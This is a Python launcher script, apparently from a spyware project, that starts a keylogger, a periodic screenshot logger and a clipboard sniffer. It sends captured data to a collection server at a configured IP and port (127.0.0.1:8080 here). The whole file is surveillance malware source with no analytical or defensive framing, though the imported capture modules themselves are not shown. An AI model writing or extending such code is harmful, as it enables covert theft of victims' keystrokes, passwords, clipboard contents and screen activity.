from key_log.key_logger import KeyLogger
from screenshot_log.screenshot_logger import ScreenshotLogger
from clipboard_sniffer.clipboard_module import ClipboardLogger
import threading
import sys

sys.dont_write_bytecode = True


if __name__ == "__main__":
    screenshot_logger = ScreenshotLogger(interval = 10)
    screenshot_thread = threading.Thread(target = screenshot_logger.start)
    screenshot_thread.daemon = True
    screenshot_thread.start()

    clipboard = ClipboardLogger(interval=5, server_ip="127.0.0.1", port=8080)
    clipboard.launch_clipboard_sniffer()

    keylogger = KeyLogger(interval=10, port="8080", server_ip="127.0.0.1")
    keylogger.start()



